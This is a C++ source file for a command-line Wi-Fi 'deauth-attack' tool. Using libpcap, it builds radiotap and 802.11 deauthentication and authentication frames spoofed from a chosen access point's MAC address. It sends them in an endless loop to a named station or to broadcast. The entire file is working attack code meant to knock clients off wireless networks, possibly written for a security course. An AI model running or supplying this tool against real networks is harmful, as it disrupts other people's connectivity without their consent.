#include <iostream>
#include <unistd.h>
#include <tins/tins.h>
#include <pcap.h>
#include <cstdio>
#include <cstring>

using namespace std;

void usage(){
	cout << "deauth-attack <interface> <ap mac> [<station mac> [-auth]]" << endl;
	cout << "deauth-attack wlan0 00:11:22:33:44:55 66:77:88:99:AA:BB" << endl;
	exit(0);
}

struct auth_attack_packet{
	uint8_t header_revision = 0;
	uint8_t header_pad = 0;
	uint16_t header_length = 24;
	uint32_t present_flags1 = 0;
	uint64_t dummy1 = 0;
	uint64_t dummy2 = 0;
	uint32_t type = 0xb0;
	char destination[6];
	char source[6];
	char bssid[6];
	uint16_t sequence_number = 0;
	uint16_t authentication_algorithm = 0;
	uint16_t authentication_seq = 1;
	uint16_t status_code = 0;
} __attribute__((__packed__));


struct deauth_attack_packet{
	uint8_t header_revision = 0;
	uint8_t header_pad = 0;
	uint16_t header_length = 24;
	uint32_t present_flags1 = 0;
	uint64_t dummy1 = 0;
	uint64_t dummy2 = 0;
	uint32_t type = 0xc0;
	char destination[6];
	char source[6];
	char bssid[6];
	uint16_t sequence_number = 0;
	uint16_t reason_code= 0;
} __attribute__((__packed__));


void set_mac(char *target, char *str){
	sscanf(str,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&target[0], &target[1], &target[2], &target[3], &target[4], &target[5]);
}

int main(int argc, char *argv[]) {
	string ap_mac;
	string station_mac;

	if (argc == 3 || argc == 4 || (argc == 5 && !strncmp(argv[4],"-auth",5)));
	else usage();



	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", argv[1], errbuf);
		return -1;
	}

	if(argc == 5){
		struct auth_attack_packet auth_packet;
		cout << "[*] Auth_attack triggerd" << endl;
		set_mac(auth_packet.destination,argv[2]);
		set_mac(auth_packet.source,argv[3]);
		set_mac(auth_packet.bssid,argv[2]);

		while(true) {
			int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&auth_packet), sizeof(struct auth_attack_packet));
	    	if (res != 0)fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        	usleep(100000);
		}

	}else{
		struct deauth_attack_packet deauth_packet;
		cout << "[*] Deauth_attack triggerd" << endl;
		if (argc==3) memset(deauth_packet.destination,255,6);
		else set_mac(deauth_packet.destination,argv[3]);
		set_mac(deauth_packet.source,argv[2]);
		set_mac(deauth_packet.bssid,argv[2]);

		while(true) {
			int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&deauth_packet), sizeof(struct deauth_attack_packet));
	    	if (res != 0)fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        	usleep(100000);
		}
	}



	return 0;
}
